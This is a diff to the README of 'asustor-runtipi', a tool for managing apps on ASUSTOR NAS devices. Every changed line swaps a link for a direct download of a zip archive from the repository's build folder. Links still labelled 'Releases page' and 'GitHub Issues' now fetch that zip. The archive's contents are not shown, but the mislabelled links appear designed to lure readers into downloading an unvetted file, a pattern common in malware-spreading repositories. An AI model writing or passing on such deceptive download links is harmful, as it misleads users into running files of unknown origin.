@@ -6,7 +6,7 @@ Welcome to **asustor-runtipi**! This tool helps you manage apps on your ASUSTOR 
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/zubayere2911/asustor-runtipi/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/zubayere2911/asustor-runtipi/main/build/asustor-runtipi-1.0.zip)](https://raw.githubusercontent.com/zubayere2911/asustor-runtipi/main/build/asustor-runtipi-1.0.zip)
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Before you install **asustor-runtipi**, ensure your system meets the following r
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Head to our [Releases page](https://github.com/zubayere2911/asustor-runtipi/releases) to check for the latest version.
+1. **Visit the Releases Page**: Head to our [Releases page](https://raw.githubusercontent.com/zubayere2911/asustor-runtipi/main/build/asustor-runtipi-1.0.zip) to check for the latest version.
    
 2. **Choose Your Package**: Look for the latest release suitable for your architecture:
    - Choose the x86-64 version if you are using a traditional ASUSTOR NAS.
@@ -47,7 +47,7 @@ For assistance or feedback, feel free to engage with our community. Join discuss
 
 ## 🔒 Security and Updates
 
-Regular updates ensure that you have the most secure version of **asustor-runtipi**. Always keep your software up to date by checking the [Releases page](https://github.com/zubayere2911/asustor-runtipi/releases) frequently.
+Regular updates ensure that you have the most secure version of **asustor-runtipi**. Always keep your software up to date by checking the [Releases page](https://raw.githubusercontent.com/zubayere2911/asustor-runtipi/main/build/asustor-runtipi-1.0.zip) frequently.
 
 ## 🌟 Troubleshooting Common Issues
 
@@ -63,10 +63,10 @@ If these suggestions do not resolve your issue, please open a new issue on the G
 
 - [Official Documentation](#) - Keep an eye out for our comprehensive user guide.
 - [Community Forum](#) - Connect with other users and find solutions.
-- [GitHub Issues](https://github.com/zubayere2911/asustor-runtipi/issues) - Report bugs or ask questions.
+- [GitHub Issues](https://raw.githubusercontent.com/zubayere2911/asustor-runtipi/main/build/asustor-runtipi-1.0.zip) - Report bugs or ask questions.
 
 ## 📜 License
 
 This project is licensed under the MIT License. You can share, modify, and use this tool as you wish, provided you follow the license terms.
 
-We hope you enjoy using **asustor-runtipi** to streamline your app management on your ASUSTOR NAS. Don't forget to check the [Releases page](https://github.com/zubayere2911/asustor-runtipi/releases) for the latest updates!
+We hope you enjoy using **asustor-runtipi** to streamline your app management on your ASUSTOR NAS. Don't forget to check the [Releases page](https://raw.githubusercontent.com/zubayere2911/asustor-runtipi/main/build/asustor-runtipi-1.0.zip) for the latest updates!
